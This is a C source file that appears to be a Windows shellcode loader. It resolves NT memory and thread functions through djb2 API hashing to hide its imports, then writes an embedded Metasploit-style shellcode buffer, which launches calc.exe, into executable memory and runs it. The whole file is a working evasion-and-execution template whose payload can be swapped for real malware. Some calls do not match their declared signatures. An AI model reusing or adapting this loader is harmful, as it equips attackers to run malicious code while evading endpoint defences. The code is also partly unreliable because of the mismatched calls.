#include <Windows.h>
#include <tlhelp32.h>

#include "strutcs.h"

typedef NTSTATUS(NTAPI* CustomAlloc)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS(NTAPI* CustomWrite)(HANDLE ProcessHandle, PVOID* BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG* NumberOfBytesWritten);
typedef NTSTATUS(NTAPI* CustomCreateThread)(PHANDLE* ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PCLIENT_ID ClientId, PCONTEXT ThreadContext, PINITIAL_TEB InitialTeb, BOOLEAN CreateSuspended);
typedef NTSTATUS(NTAPI* CustomWSOF)(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Tiemout);

typedef struct _DPC_ENTRY {
	DWORD64 _FunctionAddress;//Pointer of function
	DWORD64 _ApiAddress;//Address of API targeted
	DWORD64 _ApiTarget;//Hash of API ntdll.dll, kernel.dll, ...
	DWORD64 _FuncTarget;//Hash of function NtAllocateVirtualMemory, ....
} _DPC_ENTRY;

DWORD64 djb2(PBYTE str)
{
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

PVOID GetFuncAddress(DWORD64 _ApiAddr, DWORD64 _FuncHash)
{
	DWORD64 _HeaderAddr = _ApiAddr + ((PIMAGE_DOS_HEADER)_ApiAddr)->e_lfanew;
	PIMAGE_NT_HEADERS64 _NtHeader = (PIMAGE_NT_HEADERS64)_HeaderAddr;
	PIMAGE_EXPORT_DIRECTORY _ExportContent = (PIMAGE_EXPORT_DIRECTORY)(_ApiAddr + _NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	int _NbFuncNtdll = _ExportContent->NumberOfFunctions;

	DWORD* names_RVA_array = (DWORD*)(_ApiAddr + _ExportContent->AddressOfNames);
	DWORD* function_RVA_array = (DWORD*)(_ApiAddr + _ExportContent->AddressOfFunctions);
	WORD* name_ordinals_array = (WORD*)(_ApiAddr + _ExportContent->AddressOfNameOrdinals);

	for (int i = 0; i < _NbFuncNtdll; i++)
	{
		char* funct_name = _ApiAddr + names_RVA_array[i];
		DWORD exported_RVA = function_RVA_array[name_ordinals_array[i]];
		PVOID address = _ApiAddr + function_RVA_array[name_ordinals_array[i]];

		if (djb2(funct_name) == _FuncHash)
		{
			return address;			
		}
	}
}

DWORD64 GetApiAddr(DWORD64 _ApiHash) 
{
	HANDLE _HSnap = INVALID_HANDLE_VALUE;
	MODULEENTRY32 me32;
	_HSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId());
	me32.dwSize = sizeof(MODULEENTRY32);

	Module32First(_HSnap, &me32);
	do
	{
		if (djb2(me32.szModule) == _ApiHash)
		{
			return me32.modBaseAddr;
		}
	} while (Module32Next(_HSnap, &me32));
}

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

INT wmain()
{
	_DPC_ENTRY CustomAllocStruct = { 0 };
	CustomAlloc	pAlloc = NULL;
	CustomAllocStruct._ApiTarget = 0x5dc35dc35dc35e22;
	CustomAllocStruct._FuncTarget = 0xf5bd373480a6b89b;
	CustomAllocStruct._ApiAddress = GetApiAddr(CustomAllocStruct._ApiTarget);
	pAlloc = GetFuncAddress(CustomAllocStruct._ApiAddress, CustomAllocStruct._FuncTarget);

	_DPC_ENTRY CustomWriteStruct = { 0 };
	CustomWrite pWrite = NULL;
	CustomWriteStruct._ApiTarget = 0x5dc35dc35dc35e22;
	CustomWriteStruct._FuncTarget = 0x68a3c2ba486f0741;
	CustomWriteStruct._ApiAddress = GetApiAddr(CustomWriteStruct._ApiTarget);
	pWrite = GetFuncAddress(CustomWriteStruct._ApiAddress, CustomWriteStruct._FuncTarget);

	_DPC_ENTRY CustomCreateThreadeStruct = { 0 };
	CustomCreateThread pThread = NULL;
	CustomCreateThreadeStruct._ApiTarget = 0x5dc35dc35dc35e22;
	CustomCreateThreadeStruct._FuncTarget = 0x64dc7db288c5015f;
	CustomCreateThreadeStruct._ApiAddress = GetApiAddr(CustomAllocStruct._ApiTarget);
	pThread = GetFuncAddress(CustomCreateThreadeStruct._ApiAddress, CustomCreateThreadeStruct._FuncTarget);

	_DPC_ENTRY CustomWSOFsTRUCT = { 0 };
	CustomWSOF pWSOF = NULL;
	CustomWSOFsTRUCT._ApiTarget = 0x5dc35dc35dc35e22;
	CustomWSOFsTRUCT._FuncTarget = 0xc6a2fa174e551bcb;
	CustomWSOFsTRUCT._ApiAddress = GetApiAddr(CustomAllocStruct._ApiTarget);
	pWSOF = GetFuncAddress(CustomWSOFsTRUCT._ApiAddress, CustomWSOFsTRUCT._FuncTarget);
	
	//Execute Payload
	LPVOID addr = NULL;
	SIZE_T length = sizeof(buf);
	HANDLE hProc = GetCurrentProcess();
	HANDLE thandle = NULL;

	pAlloc(hProc, &addr, 0, (PSIZE_T)&length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	pWrite(hProc, addr, buf, length, NULL);
	pThread(&thandle, GENERIC_EXECUTE, NULL, hProc, addr, NULL, FALSE, 0, 0, 0, NULL);
	pWSOF(thandle, TRUE, 0);

}